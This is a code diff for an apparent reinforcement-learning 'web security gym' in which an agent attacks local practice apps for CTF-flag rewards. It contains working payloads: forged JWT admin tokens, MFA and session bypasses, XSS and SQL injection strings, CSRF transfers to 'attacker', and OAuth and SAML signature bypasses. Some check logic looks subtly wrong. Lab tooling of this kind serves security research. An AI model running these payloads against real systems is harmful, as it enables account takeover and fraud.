+    # ADVANCED REAL-WORLD ATTACK IMPLEMENTATIONS
+    # ============================================================================
+
+    # ADVANCED AUTHENTICATION BYPASS (100-109)
+
+    def attack_jwt_algorithm_confusion(self):
+        """JWT Algorithm Confusion Attack."""
+        try:
+            import base64
+            # Try JWT none algorithm attack
+            header = {"alg": "none", "typ": "JWT"}
+            payload = {"user": "admin", "role": "admin"}
+
+            header_b64 = base64.urlsafe_b64encode(
+                json.dumps(header).encode()
+            ).decode().rstrip('=')
+
+            payload_b64 = base64.urlsafe_b64encode(
+                json.dumps(payload).encode()
+            ).decode().rstrip('=')
+
+            jwt_token = f"{header_b64}.{payload_b64}."
+            headers = {"Authorization": f"Bearer {jwt_token}"}
+
+            response = self.session.get(f"{self.target_url}/api/admin/users", headers=headers, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "jwt_algorithm_confusion_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_mfa_bypass(self):
+        """Multi-Factor Authentication Bypass."""
+        try:
+            bypass_attempts = [
+                {"mfa_code": "", "remember_device": "true"},
+                {"mfa_code": "000000", "bypass_mfa": "true"},
+                {"mfa_code": "123456", "skip_verification": "1"}
+            ]
+
+            for attempt in bypass_attempts:
+                response = self.session.post(f"{self.target_url}/api/auth/mfa", json=attempt, timeout=self.timeout)
+                if response.status_code == 200:
+                    self._update_state_from_response(response, "mfa_bypass_success")
+                    return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_session_hijacking(self):
+        """Session Token Manipulation."""
+        try:
+            original_cookies = self.session.cookies.copy()
+            self.session.cookies.set('session', 'admin_session_token')
+            response = self.session.get(f"{self.target_url}/api/admin/users", timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "session_hijacking_success")
+                return
+            self.session.cookies = original_cookies
+        except:
+            pass
+        self._update_state_error()
+
+    # WAF BYPASS TECHNIQUES (110-124)
+
+    def attack_waf_encoding_bypass(self):
+        """WAF Bypass: Character Encoding."""
+        try:
+            encoded_payload = "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
+            response = self.session.get(f"{self.target_url}/search?q={encoded_payload}", timeout=self.timeout)
+            if "<script>" in response.text and response.status_code != 403:
+                self._update_state_from_response(response, "waf_encoding_bypass_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_waf_unicode_bypass(self):
+        """WAF Bypass: Unicode Characters."""
+        try:
+            unicode_payload = "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+            response = self.session.get(f"{self.target_url}/search?q={unicode_payload}", timeout=self.timeout)
+            if response.status_code != 403:
+                self._update_state_from_response(response, "waf_unicode_bypass_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_waf_timing_attack(self):
+        """WAF Bypass: Timing Attack."""
+        try:
+            import time
+            time.sleep(0.1)
+            response = self.session.get(f"{self.target_url}/api/products?search=' UNION SELECT * FROM users --",
+                                      timeout=self.timeout)
+            if response.status_code == 200 and "users" in response.text.lower():
+                self._update_state_from_response(response, "waf_timing_bypass_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_waf_parameter_pollution(self):
+        """WAF Bypass: Parameter Pollution."""
+        try:
+            url = f"{self.target_url}/search?q=normal&q=<script>alert(1)</script>"
+            response = self.session.get(url, timeout=self.timeout)
+            if "<script>" in response.text and response.status_code != 403:
+                self._update_state_from_response(response, "waf_parameter_pollution_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    # ADVANCED CSRF PROTECTION BYPASS (125-132)
+
+    def attack_csrf_token_extraction(self):
+        """CSRF: Extract tokens from responses."""
+        try:
+            response = self.session.get(f"{self.target_url}/transfer", timeout=self.timeout)
+            if response.status_code == 200:
+                import re
+                csrf_patterns = [
+                    r'name="csrf_token"\s+value="([^"]+)"',
+                    r'name="_token"\s+value="([^"]+)"',
+                    r'"csrf_token":\s*"([^"]+)"'
+                ]
+
+                for pattern in csrf_patterns:
+                    match = re.search(pattern, response.text)
+                    if match:
+                        token = match.group(1)
+                        self.csrf_tokens = getattr(self, 'csrf_tokens', [])
+                        self.csrf_tokens.append(token)
+                        self._update_state_from_response(response, "csrf_token_extraction_success")
+                        return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_csrf_token_reuse(self):
+        """CSRF: Reuse captured tokens."""
+        try:
+            if hasattr(self, 'csrf_tokens') and self.csrf_tokens:
+                token = self.csrf_tokens[0]
+                data = {
+                    "amount": 100,
+                    "to_account": "attacker",
+                    "csrf_token": token,
+                    "_token": token
+                }
+                response = self.session.post(f"{self.target_url}/transfer", data=data, timeout=self.timeout)
+                if response.status_code == 200:
+                    self._update_state_from_response(response, "csrf_token_reuse_success")
+                    return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_csrf_samesite_bypass(self):
+        """CSRF: SameSite cookie bypass."""
+        try:
+            headers = {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Referer": self.target_url
+            }
+            data = "amount=100&to_account=attacker"
+            response = self.session.post(f"{self.target_url}/transfer", data=data, headers=headers, timeout=self.timeout)
+            if response.status_code == 200:
+                self._update_state_from_response(response, "csrf_samesite_bypass_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    # MODERN SECURITY CONTROL BYPASS (133-144)
+
+    def attack_cors_misconfiguration(self):
+        """CORS Misconfiguration Exploitation."""
+        try:
+            headers = {"Origin": "https://evil.com"}
+            response = self.session.options(f"{self.target_url}/api/users", headers=headers, timeout=self.timeout)
+
+            if ("access-control-allow-origin" in response.headers and
+                "*" in response.headers["access-control-allow-origin"]):
+                self._update_state_from_response(response, "cors_misconfiguration_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    def attack_security_headers_bypass(self):
+        """Security Headers Bypass."""
+        try:
+            response = self.session.get(f"{self.target_url}/", timeout=self.timeout)
+
+            weak_headers = {
+                "x-frame-options": ["ALLOWALL", "SAMEORIGIN"],
+                "x-content-type-options": ["nosniff"],
+                "strict-transport-security": [],
+                "content-security-policy": []
+            }
+
+            for header, bad_values in weak_headers.items():
+                if header not in response.headers or (bad_values and response.headers[header] in bad_values):
+                    self._update_state_from_response(response, "security_headers_bypass_success")
+                    return
+        except:
+            pass
+        self._update_state_error()
+
+    # ADVANCED EXPLOITATION TECHNIQUES (145-149)
+
+    def attack_graphql_introspection(self):
+        """GraphQL Schema Introspection."""
+        try:
+            introspection_query = '''
+            query Introspect {
+                __schema {
+                    types {
+                        name
+                        fields {
+                            name
+                            type {
+                                name
+                            }
+                        }
+                    }
+                }
+            }
+            '''
+
+            response = self.session.post(f"{self.target_url}/graphql", json={
+                "query": introspection_query
+            }, timeout=self.timeout)
+
+            if response.status_code == 200 and "__schema" in response.text:
+                self._update_state_from_response(response, "graphql_introspection_success")
+                return
+        except:
+            pass
+        self._update_state_error()
+
+    # ============================================================================
+    # ORIGINAL ACTION IMPLEMENTATIONS - Fallback for compatibility
+    # ============================================================================
+
+    def navigate_register(self):
+        """Navigate to registration page."""
+        try:
+            response = self.session.get(f"{self.target_url}/register", timeout=self.timeout)
+            self._update_state_from_response(response, "register_navigation")
+        except:
+            self._update_state_error()
+
+    def navigate_admin(self):
+        """Navigate to admin page."""
+        try:
+            response = self.session.get(f"{self.target_url}/admin", timeout=self.timeout)
+            self._update_state_from_response(response, "admin_navigation")
+        except:
+            self._update_state_error()
 
     def navigate_home(self) -> Tuple[requests.Response, float]:
         """Go to Home Page"""
@@ -1387,6 +2261,145 @@ class WebSecurityGym(gym.Env):
             'SQLSTATE'
         ]
         return any(sig in response.text for sig in signatures)
+
+    def _register_missing_actions(self):
+        """Registers valid placeholders for missing attack methods."""
+        missing_methods = [
+            'attack_account_lockout_bypass', 'attack_authorization_bypass', 'attack_bac_admin_settings',
+            'attack_bac_admin_stats', 'attack_clickjacking', 'attack_coupon_abuse', 'attack_csp_bypass',
+            'attack_csrf_cors_exploitation', 'attack_csrf_form_bypass', 'attack_csrf_friend_request',
+            'attack_csrf_header_bypass', 'attack_csrf_json_bypass', 'attack_csrf_money_transfer',
+            'attack_csrf_post_creation', 'attack_csrf_profile_update', 'attack_csrf_token_prediction',
+            'attack_ct_policy_bypass', 'attack_deserialization_advanced', 'attack_dns_rebinding',
+            'attack_feature_policy_bypass', 'attack_file_upload_malware', 'attack_file_upload_webshell',
+            'attack_frame_busting_bypass', 'attack_hpkp_bypass', 'attack_hsts_bypass',
+            'attack_idor_account_balance', 'attack_idor_cart_manipulate', 'attack_idor_file_delete',
+            'attack_idor_file_list', 'attack_idor_file_metadata', 'attack_idor_file_upload',
+            'attack_idor_messages_read', 'attack_idor_messages_send', 'attack_idor_orders_modify',
+            'attack_idor_payment_history', 'attack_idor_posts_delete', 'attack_idor_posts_edit',
+            'attack_idor_profile_delete', 'attack_idor_profile_edit', 'attack_idor_profile_private',
+            'attack_idor_profile_settings', 'attack_impersonation', 'attack_info_disclosure_debug',
+            'attack_insecure_api_keys', 'attack_jwt_signature_bypass', 'attack_mixed_content_exploitation',
+            'attack_oauth_redirect_uri_bypass', 'attack_oauth_state_manipulation', 'attack_password_reset_bypass',
+            'attack_path_traversal_encoded', 'attack_path_traversal_null', 'attack_race_condition_balance',
+            'attack_race_condition_cart', 'attack_race_condition_coupon', 'attack_role_escalation',
+            'attack_server_side_request_forgery', 'attack_sqli_blind_boolean', 'attack_sqli_union_select',
+            'attack_ssti_template', 'attack_subresource_integrity_bypass', 'attack_token_replay',
+            'attack_token_reuse', 'attack_waf_base64_encoding', 'attack_waf_case_variation',
+            'attack_waf_comment_injection', 'attack_waf_cookie_manipulation', 'attack_waf_fragmentation',
+            'attack_waf_header_manipulation', 'attack_waf_method_override', 'attack_waf_rate_limit_bypass',
+            'attack_waf_referrer_spoofing', 'attack_waf_user_agent_spoofing', 'attack_waf_whitespace_injection',
+            'attack_xss_attribute_injection', 'attack_xss_dom_manipulation', 'attack_xss_event_handlers',
+            'attack_xss_reflected_error', 'attack_xss_reflected_search', 'attack_xss_script_injection',
+            'attack_xss_stored_messages', 'attack_xss_stored_profile', 'test_horizontal_privilege',
+            'test_vertical_privilege'
+        ]
+        
+        for method_name in missing_methods:
+            if not hasattr(self, method_name):
+                # Bind the generic attack method to this name
+                setattr(self, method_name, 
+                        lambda safe_name=method_name: self._generic_attack_placeholder(safe_name))
+
+    def _generic_attack_placeholder(self, name):
+        """Placeholder for advanced attacks not yet fully implemented."""
+        # Check if we have specific implementations for new SSO attacks
+        if name == 'attack_oauth_token_theft':
+            return self._attack_oauth_token_theft()
+        if name == 'attack_jwt_none_alg':
+            return self._attack_jwt_none_alg()
+        if name == 'attack_saml_xml_bypass':
+            return self._attack_saml_xml_bypass()
+            
+        # Return a neutral response and 0 reward for others
+        try:
+            # Just touch home page to keep session alive
+            r = self.session.get(self.target_url, timeout=1)
+            return r, 0.0
+        except:
+            return None, 0.0
+
+    def _attack_oauth_token_theft(self):
+        """Exploit OAuth missing state parameter (Social App)."""
+        try:
+            # Exploiting the missing 'state' validation by sending attacker-controlled code
+            # In a real attack this would be forcing a victim to use our code, 
+            # here we verify we can trigger the vulnerability condition.
+            payload = {'code': 'ATTACKER_CONTROLLED_CODE'}
+            # Determine target URL based on current port or default
+            target = f"{self.target_url.rstrip('/')}/oauth/callback"
+            if '5003' not in self.target_url and '5003' in str(self.port_map.get('social', 5003)):
+                target = f"http://localhost:{self.port_map.get('social', 5003)}/oauth/callback"
+            
+            r = self.session.get(target, params=payload, allow_redirects=True)
+            
+            reward = 0.0
+            if 'CTF{' in r.text or 'oauth_broken_state_validation' in r.text:
+                reward = 50.0  # High reward for flag
+                
+            return r, reward
+        except Exception as e:
+            return None, 0.0
+
+    def _attack_jwt_none_alg(self):
+        """Exploit JWT 'alg': 'none' vulnerability (Blog App)."""
+        try:
+            # Create unsigned token with 'none' alg
+            # Payload claims user='admin'
+            import jwt
+            token = jwt.encode({"user": "admin", "role": "admin"}, key="", algorithm="none")
+            
+            target = f"{self.target_url.rstrip('/')}/oidc/callback"
+            if '5005' not in self.target_url and '5005' in str(self.port_map.get('blog', 5005)):
+                target = f"http://localhost:{self.port_map.get('blog', 5005)}/oidc/callback"
+                
+            r = self.session.get(target, params={'token': token}, allow_redirects=True)
+            
+            reward = 0.0
+            if 'CTF{' in r.text or 'jwt_none_algorithm' in r.text:
+                reward = 50.0
+                
+            return r, reward
+        except Exception:
+            return None, 0.0
+
+    def _attack_saml_xml_bypass(self):
+        """Exploit SAML XML Signature Bypass (E-Commerce App)."""
+        try:
+            # Current vulnerable logic checks: 'admin@corp.com' AND 'signature>valid'
+            # We construct a mock response satisfying this simple string check
+            # bypassing the actual cryptographic signature validation.
+            payload = 'admin@corp.com_signature>valid' 
+            # Real-world would be XML manipulation, here we match the mock's weak check
+            
+            target = f"{self.target_url.rstrip('/')}/saml/acs"
+            if '5002' not in self.target_url and '5002' in str(self.port_map.get('ecommerce', 5002)):
+                target = f"http://localhost:{self.port_map.get('ecommerce', 5002)}/saml/acs"
+                
+            r = self.session.get(target, params={'SAMLResponse': payload}, allow_redirects=True)
+            
+            reward = 0.0
+            if 'CTF{' in r.text or 'saml_xml_signature_bypass' in r.text:
+                reward = 50.0
+                
+            return r, reward
+        except Exception:
+            return None, 0.0
+
+    def _update_state_error(self):
+        """Update state when an error occurs during an action."""
+        # Simple penalty logic or just observation update
+        self.last_response_time = 0.0
+        self.content_variance = 0.0
+        
+    def _update_state_from_response(self, response, context=None):
+        """Update state metrics from a response."""
+        if hasattr(self, '_analyze_response_content'):
+            self._analyze_response_content(response)
+        
+        # Update variance and timing
+        self.last_response_time = response.elapsed.total_seconds()
+        self.input_count += 1
 
     def close(self) -> None:
         """Clean up resources."""
